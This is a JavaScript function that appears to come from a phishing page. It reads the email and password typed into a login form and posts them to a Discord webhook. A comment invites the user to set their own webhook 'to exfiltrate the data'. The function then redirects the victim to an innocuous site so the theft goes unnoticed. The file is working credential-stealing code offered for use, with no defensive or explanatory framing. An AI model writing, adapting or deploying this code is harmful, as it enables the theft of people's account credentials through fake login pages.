async function send_login() {
    // SET YOUR DISCORD WEBHOOK or whatever you want to exfiltrate the data
    const discord_webhook_url = "https://discord.com/api/webhooks/123/abc";

    // Retrieve data from POST form
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Create message content
    const message = "Email: " + email + " \n " + "Password: " + password;

    try {
        // Send POST request to Discord webhook URL
        const response = await fetch(discord_webhook_url, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ content: message })
        });
        if (response.ok) {
            window.location.href = "https://www.example.com";
        } else {
            // Otherwise, throw a generic error
            throw new Error('Generic error!');
        }
    } catch (error) {
        // Log any errors to the console
        console.error(error);
    }

}